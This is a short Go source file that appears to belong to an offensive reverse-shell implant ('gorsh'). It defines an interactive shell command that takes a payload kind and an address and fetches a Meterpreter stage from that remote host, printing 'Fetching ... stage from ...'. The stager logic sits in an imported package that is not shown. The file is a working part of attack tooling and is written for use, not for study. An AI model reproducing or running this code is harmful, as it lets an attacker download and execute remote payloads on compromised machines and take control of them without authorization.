package cmds

import (
	"git.i.ctrl.red/blink/gorsh/pkg/meterpreter"

	"github.com/abiosoft/ishell"
)

func Met(c *ishell.Context) {
	if len(c.Args) != 2 {
		c.Println("needs 2 args")
		return
	}

	kind, addr := c.Args[0], c.Args[1]
	_, err := meterpreter.Meterpreter(kind, addr)
	if err != nil {
		c.Println(err.Error())
		return
	}
	c.Printf("Fetching %s stage from %s\n", kind, addr)
}
